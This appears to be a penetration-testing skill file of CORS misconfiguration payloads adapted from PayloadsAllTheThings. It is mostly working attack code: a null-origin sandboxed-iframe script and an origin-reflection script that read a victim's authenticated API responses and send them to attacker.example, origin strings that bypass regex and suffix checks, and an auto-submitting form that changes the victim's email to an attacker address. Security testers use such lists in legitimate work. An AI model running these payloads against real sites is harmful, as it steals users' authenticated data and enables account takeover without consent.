---
description: Null origin, subdomain wildcard, pre-flight bypass
skill: cors-testing
source: PayloadsAllTheThings — CORS Misconfiguration
source_revision: 3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a
source_license: MIT; see THIRD_PARTY_NOTICES.md
---

# CORS Misconfiguration Payloads

> Source: PayloadsAllTheThings — CORS Misconfiguration

## Detection

Check if the server reflects the Origin header:

```bash
curl -s -I -H "Origin: https://evil.example" https://target.example/api/user | grep -i "access-control"
```

Vulnerable response:

```
Access-Control-Allow-Origin: https://evil.example
Access-Control-Allow-Credentials: true
```

## Null Origin Bypass

Server allows `Origin: null` with credentials. Use a sandboxed iframe to send requests with null origin.

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
      location = 'https://attacker.example/log?data=' + encodeURIComponent(this.responseText);
    };
    req.open('GET', 'https://target.example/api/sensitive', true);
    req.withCredentials = true;
    req.send();
  </script>">
</iframe>
```

## Origin Reflection (Wildcard Credential Theft)

Server reflects any Origin header back and allows credentials.

```html
<script>
var req = new XMLHttpRequest();
req.onload = function() {
  // Exfiltrate stolen data
  fetch('https://attacker.example/log', {
    method: 'POST',
    body: this.responseText
  });
};
req.open('GET', 'https://target.example/api/sensitive', true);
req.withCredentials = true;
req.send();
</script>
```

## Subdomain Wildcard / Regex Bypass

Server trusts `*.target.example` — exploit XSS on any subdomain, or register a lookalike domain if regex is weak.

### Unescaped Dot in Regex

If server validates `^api.target.example$` (unescaped dot), register `apiatarget.example`.

### Prefix/Suffix Matching Bypass

If server checks `endswith("target.example")`:

```
Origin: https://evil-target.example     -> may be accepted
Origin: https://attackertarget.example  -> may be accepted
```

## Pre-flight Bypass

Simple requests (GET, POST with standard Content-Type) skip pre-flight OPTIONS check:

```html
<!-- No pre-flight needed for simple requests -->
<form action="https://target.example/api/change-email" method="POST">
  <input name="email" value="attacker@evil.example">
</form>
<script>document.forms[0].submit();</script>
```
